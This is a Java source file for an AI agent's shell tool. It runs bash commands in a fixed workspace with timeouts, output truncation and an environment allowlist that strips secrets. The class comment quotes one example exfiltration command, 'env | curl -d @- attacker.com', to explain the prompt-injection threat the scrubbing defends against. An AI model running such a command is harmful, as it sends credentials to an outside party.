package ai.nizo.tools.shell;

import ai.nizo.api.tool.Tool;
import ai.nizo.api.tool.ToolResult;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.TimeUnit;

/**
 * Run a shell command in a constrained workspace.
 *
 * <p>Constraints (defense in depth, NOT a hardened sandbox):
 * <ul>
 *   <li>Working directory is fixed to {@code NIZO_HOME/workspace} (auto-created).</li>
 *   <li>Default timeout 30 s, cap 120 s (stdout/stderr captured).</li>
 *   <li>Combined output truncated to 16 KB sent back to the model.</li>
 *   <li>Uses {@code bash -c}; the model can chain commands at its own risk.</li>
 *   <li><b>Environment is scrubbed.</b> Only an allowlist of innocuous variables is passed
 *       into the child process; secrets like {@code HF_TOKEN}, {@code BRAVE_API_KEY},
 *       {@code TELEGRAM_BOT_TOKEN}, {@code NIZO_LLM_TOKEN}, {@code SMARTPROXY_PASSWORD},
 *       OAuth tokens, and anything else from the agent's parent environment are NOT
 *       inherited. This is a hard security boundary against prompt-injected
 *       {@code env | curl -d @- attacker.com}-style exfiltration.</li>
 * </ul>
 *
 * <p>The default allowlist is the small set in {@link #DEFAULT_ENV_ALLOWLIST} — enough for
 * everyday tools (PATH for binary lookup, HOME/USER for user-aware utilities, LANG/LC_ALL
 * for locale-correct output, SHELL/TERM for tools that probe TTY context). It deliberately
 * does NOT include any variable starting with a typical secret prefix (TOKEN, KEY, SECRET,
 * PASSWORD).
 *
 * <p>To allow extra variables (e.g. a project-specific {@code MY_DEBUG=1}), set
 * {@code NIZO_SHELL_ENV_EXTRA="VAR1,VAR2"} in the parent environment. Variables in this
 * comma-separated list are passed through if present in the parent environment. The list
 * is read once at construction; restart the agent to change it. Be conservative — anything
 * you add becomes accessible to anything the model decides to run.
 *
 * <p>This is NOT a security boundary against arbitrary code execution. For untrusted code use
 * a real sandbox (firejail, bubblewrap, container). The constraint here is to (a) prevent the
 * agent from running away with files outside its workspace under normal benign use, and
 * (b) prevent secrets from leaking via the child process environment.
 */
public final class ShellTool implements Tool {

    private static final Logger LOG = LoggerFactory.getLogger(ShellTool.class);
    private static final ObjectMapper MAPPER = new ObjectMapper();
    private static final int DEFAULT_TIMEOUT_S = 30;
    private static final int MAX_TIMEOUT_S = 120;
    private static final int MAX_OUTPUT_CHARS = 16_000;

    /**
     * Innocuous environment variables passed through to child processes by default. Anything
     * outside this set is stripped — see class javadoc for the security rationale.
     */
    static final Set<String> DEFAULT_ENV_ALLOWLIST = Set.of(
            "PATH",       // binary lookup; without it nearly everything fails
            "HOME",       // ~/ expansion, ~/.config/* lookups
            "USER",       // user-aware utilities (whoami fallback, git default author)
            "LOGNAME",    // alias for USER on most unixes
            "SHELL",      // utilities that re-exec the user's shell
            "TERM",       // terminal capability detection (less, ls --color)
            "LANG",       // locale (UTF-8 output)
            "LC_ALL",     // locale override
            "LC_CTYPE",   // locale character classification
            "TZ",         // timezone for date/log timestamps
            "TMPDIR"      // tmp directory location (macOS, some linux setups)
    );

    /** Env var name that, if present, contributes additional allowlisted names (comma-separated). */
    static final String EXTRA_ALLOWLIST_ENV = "NIZO_SHELL_ENV_EXTRA";

    private final Path workspace;
    /** Concrete env to pass to children: filtered from System.getenv() at construction. */
    private final Map<String, String> filteredEnv;

    public ShellTool(Path workspace) {
        this(workspace, System.getenv());
    }

    /**
     * Test-friendly constructor: pass an explicit "parent" environment to filter. The same
     * allowlist + {@link #EXTRA_ALLOWLIST_ENV} expansion logic applies.
     */
    ShellTool(Path workspace, Map<String, String> parentEnv) {
        this.workspace = workspace;
        try { Files.createDirectories(workspace); }
        catch (IOException e) { throw new RuntimeException("could not create shell workspace " + workspace, e); }
        this.filteredEnv = Collections.unmodifiableMap(buildFilteredEnv(parentEnv));
    }

    private static java.util.Map<String, String> buildFilteredEnv(Map<String, String> parent) {
        Set<String> allow = new LinkedHashSet<>(DEFAULT_ENV_ALLOWLIST);
        String extra = parent.get(EXTRA_ALLOWLIST_ENV);
        if (extra != null && !extra.isBlank()) {
            Arrays.stream(extra.split(","))
                    .map(String::trim)
                    .filter(s -> !s.isEmpty())
                    .forEach(allow::add);
        }
        java.util.Map<String, String> out = new java.util.HashMap<>();
        for (String k : allow) {
            String v = parent.get(k);
            if (v != null) out.put(k, v);
        }
        return out;
    }

    @Override public String name() { return "shell"; }

    @Override
    public String description() {
        return "Run a bash command. Working directory is the agent's private workspace. Use for: "
                + "running system queries (uname, df, ls, cat), grep/find inside the workspace, "
                + "small CLI utilities. NOT for installing packages or modifying files outside the "
                + "workspace. Output is truncated to 16K characters; default timeout 30 s.";
    }

    @Override
    public String parametersJsonSchema() {
        return """
            {
              "type": "object",
              "properties": {
                "command":    { "type": "string", "description": "Bash command. Will be run as: bash -c \\"<command>\\"." },
                "timeout_s":  { "type": "integer", "description": "Hard timeout in seconds (default 30, max 120).",
                                "minimum": 1, "maximum": 120 }
              },
              "required": ["command"]
            }
            """;
    }

    @Override
    public ToolResult execute(String argumentsJson) throws Exception {
        JsonNode args = MAPPER.readTree(argumentsJson == null || argumentsJson.isBlank() ? "{}" : argumentsJson);
        String command = args.path("command").asText("").trim();
        if (command.isEmpty()) return ToolResult.error("command is required");
        int timeoutS = clamp(args.path("timeout_s").asInt(DEFAULT_TIMEOUT_S), 1, MAX_TIMEOUT_S);

        ProcessBuilder pb = new ProcessBuilder("bash", "-c", command);
        pb.directory(workspace.toFile());
        pb.redirectErrorStream(true);

        // Scrub the inherited environment, then re-add only the allowlisted vars. ProcessBuilder
        // gives us a mutable view of its own environment map, so clear-and-fill works.
        Map<String, String> env = pb.environment();
        env.clear();
        env.putAll(filteredEnv);

        Process p;
        try {
            p = pb.start();
        } catch (IOException e) {
            return ToolResult.error("could not start shell: " + e.getMessage());
        }

        StringBuilder out = new StringBuilder();
        try (var is = p.getInputStream()) {
            byte[] buf = new byte[4096];
            int n;
            while ((n = is.read(buf)) != -1 && out.length() < MAX_OUTPUT_CHARS + 1024) {
                out.append(new String(buf, 0, n, StandardCharsets.UTF_8));
            }
        } catch (IOException e) {
            // fallthrough — process may have exited
        }

        boolean exited;
        try {
            exited = p.waitFor(timeoutS, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            p.destroyForcibly();
            return ToolResult.error("interrupted");
        }

        if (!exited) {
            p.destroyForcibly();
            return ToolResult.error("timeout after " + timeoutS + "s. partial output:\n"
                    + truncate(out.toString(), MAX_OUTPUT_CHARS));
        }

        int rc = p.exitValue();
        String body = truncate(out.toString(), MAX_OUTPUT_CHARS);
        String header = "exit=" + rc + " timeout=" + timeoutS + "s cwd=" + workspace + "\n---\n";
        boolean ok = (rc == 0);
        if (!ok) LOG.debug("shell rc={} cmd={}", rc, command);
        return new ToolResult(ok, header + body);
    }

    /** Visible for tests: the resolved allowlisted env that will be passed to children. */
    Map<String, String> filteredEnvForTest() { return filteredEnv; }

    private static int clamp(int v, int lo, int hi) { return Math.max(lo, Math.min(hi, v)); }
    private static String truncate(String s, int max) {
        if (s == null) return "";
        if (s.length() <= max) return s;
        return s.substring(0, max) + "\n…[truncated to " + max + " chars]";
    }
}
